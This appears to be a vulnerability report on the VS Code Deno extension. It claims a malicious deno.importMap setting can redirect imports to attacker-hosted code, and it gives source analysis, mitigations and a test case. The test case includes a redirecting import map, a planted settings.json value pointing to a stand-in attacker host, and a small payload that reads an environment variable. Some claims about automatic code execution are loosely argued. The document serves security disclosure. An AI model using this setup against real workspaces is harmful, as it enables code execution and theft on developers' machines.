### Vulnerability List

* Vulnerability Name: Malicious Import Map Configuration

* Description:
    1. An attacker creates a malicious `import_map.json` file. This file redirects standard module specifiers (e.g., `https://deno.land/std/`) to attacker-controlled locations. For example, it could redirect `https://deno.land/std/http/server.ts` to `https://malicious.attacker.com/evil_server.ts`.
    2. The attacker social engineers a victim (VS Code user using the Deno extension) into configuring their project to use the attacker's malicious `import_map.json` file. This can be achieved by:
        - Tricking the victim into manually setting the `deno.importMap` setting in VS Code to point to the attacker's malicious file (e.g., a file hosted on a public URL or included in a seemingly benign project repository).
        - Convincing the victim to open a project workspace that already contains a `.vscode/settings.json` file pre-configured with the malicious `deno.importMap` setting, pointing to a file within the project or an external URL.
    3. The victim opens a Deno project in VS Code with the Deno extension enabled.
    4. The Deno extension reads the `deno.importMap` setting, which now points to the attacker's malicious import map.
    5. When the Deno extension (or the underlying Deno Language Server) resolves module imports within the victim's project (e.g., during type checking, linting, formatting, or running tests/tasks), it uses the configured import map.
    6. Due to the malicious import map, module specifiers are resolved to attacker-controlled locations.
    7. The Deno extension fetches and potentially executes code from the attacker's controlled locations as part of the development process within the victim's VS Code environment. This could happen during operations like type checking, code completion, or when running Deno tasks or tests within the IDE.

* Impact:
    - **Code Execution:** An attacker can achieve arbitrary code execution within the victim's development environment. This malicious code can steal sensitive information (credentials, source code, environment variables), modify project files, or further compromise the victim's system.
    - **Project Corruption:** The attacker can inject malicious code into the victim's project, leading to corrupted builds, unexpected behavior, and potential supply chain attacks if the compromised project is shared or deployed.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - None evident from the provided project files. The extension reads and utilizes the `deno.importMap` setting as configured by the user without any apparent validation or security checks on the import map file's content or source.

* Missing Mitigations:
    - **Validation of `deno.importMap` source:** The extension should validate the source of the `deno.importMap` file. If it's a remote URL, consider warning the user about the potential risks before using it.
    - **Content Security Policy (CSP) for import maps:** If feasible, explore using CSP mechanisms to restrict the domains from which import maps can be loaded, or restrict the types of URLs allowed in import maps.
    - **User Warnings:** When a user configures or is about to use an `deno.importMap` from an external source, the extension should display a clear warning message highlighting the security risks involved and advising users to only use import maps from trusted sources.
    - **Sandboxing or Isolation:**  Investigate sandboxing or isolating the module resolution and execution processes that utilize the import map, to limit the impact of potentially malicious code loaded through a compromised import map.

* Preconditions:
    1. The victim must have the VS Code Deno extension installed and enabled in their workspace.
    2. The victim must be tricked into configuring the `deno.importMap` setting to point to a malicious import map file, either manually or by opening a workspace with a pre-configured malicious setting.

* Source Code Analysis:
    1. **`client/src/extension.ts`**:
        - In `clientOptions.initializationOptions`, the extension reads the `denoConfiguration` which includes the `deno.importMap` setting from VS Code workspace configuration:
        ```typescript
        initializationOptions: () => {
          const denoConfiguration = vscode.workspace.getConfiguration().get(
            EXTENSION_NS,
          ) as Record<string, unknown>;
          commands.transformDenoConfiguration(extensionContext, denoConfiguration);
          return {
            ...denoConfiguration,
            ...
          } as object;
        },
        ```
        - This `denoConfiguration` object, including `importMap`, is sent to the Deno Language Server during initialization.
    2. **`client/src/debug_config_provider.ts`**:
        - The `DenoDebugConfigurationProvider` in `#getAdditionalRuntimeArgs` reads `settings.importMap` which comes from `clientOptions.initializationOptions`.
        ```typescript
        #getAdditionalRuntimeArgs() {
          const args: string[] = [];
          const settings = this.#extensionContext.clientOptions
            .initializationOptions();
          ...
          if (settings.importMap) {
            args.push("--import-map");
            args.push(settings.importMap.trim());
          }
          ...
          return args;
        }
        ```
        - This shows that the `deno.importMap` setting is directly passed to the Deno CLI when debugging, affecting module resolution during debugging sessions.
    3. **`README.md` and `docs/workspaceFolders.md`**:
        - These documentation files confirm the existence and purpose of the `deno.importMap` setting:
        ```markdown
        - `deno.importMap`: The file path to an import map. This is the equivalent to
          using `--import-map` on the command line.
          [Import maps](https://docs.deno.com/runtime/fundamentals/configuration/#dependencies)
          provide a way to "relocate" modules based on their specifiers. The path can
          either be relative to the workspace, or an absolute path. _string, default
          `null`, examples: `./import_map.json`, `/path/to/import_map.json`,
          `C:\path\to\import_map.json`_
        ```
    4. **Absence of Validation**:
        - By reviewing the code, particularly in `client/src/extension.ts` and `client/src/debug_config_provider.ts`, there is no visible code that validates the source or content of the `deno.importMap` file. The extension appears to trust the user-provided path and uses it directly.

* Security Test Case:
    1. **Attacker Setup:**
        - Create a malicious JavaScript/TypeScript file (e.g., `evil_module.ts`) hosted on a publicly accessible web server (e.g., `https://malicious.attacker.com/evil_module.ts`). This file contains code intended to be executed on the victim's machine, such as displaying an alert or attempting to access local files.
        ```typescript
        // evil_module.ts
        console.error("Malicious code executed!");
        // Example of potentially harmful action (in a real attack, this could be worse)
        if (typeof process !== 'undefined') {
            console.error("Running in Node.js-like environment. Accessing process env:", process.env.USERNAME);
        } else {
            console.error("Not in Node.js environment, some actions might be limited.");
        }
        ```
        - Create a malicious `import_map.json` file (e.g., `malicious_import_map.json`) also hosted on a publicly accessible web server (e.g., `https://malicious.attacker.com/malicious_import_map.json`). This import map redirects a common module specifier to the attacker's malicious file.
        ```json
        {
          "imports": {
            "std/http/server.ts": "https://malicious.attacker.com/evil_module.ts"
          }
        }
        ```
    2. **Victim Setup:**
        - Open VS Code and create a new empty workspace or open an existing Deno project.
        - Enable the Deno extension for the workspace if it's not already enabled.
        - In VS Code settings for the workspace (`.vscode/settings.json` or workspace settings UI), set the `deno.importMap` setting to the URL of the attacker's malicious import map: `"deno.importMap": "https://malicious.attacker.com/malicious_import_map.json"`.
        - Create a simple Deno file (e.g., `test.ts`) in the workspace that imports a module that is redirected by the malicious import map.
        ```typescript
        // test.ts
        import * as server from "std/http/server.ts";

        console.log("This is a test Deno file.");
        ```
    3. **Triggering the Vulnerability:**
        - Open the `test.ts` file in VS Code.
        - The Deno extension will attempt to type check, lint, or provide code completion for `test.ts`. During this process, it will resolve the import `"std/http/server.ts"` using the configured malicious import map.
        - Alternatively, run a Deno task or test within the VS Code integrated terminal or using code lenses.
    4. **Verification:**
        - Observe the VS Code output panel for the Deno extension or the integrated terminal output. If the vulnerability is successfully triggered, you will see the "Malicious code executed!" message and potentially other outputs from `evil_module.ts`, indicating that the attacker's code has been executed within the VS Code environment.
        - In a real attack scenario, the malicious code could perform more harmful actions without being immediately visible in the output.

This test case demonstrates how a malicious import map can lead to code execution within the VS Code Deno extension context.
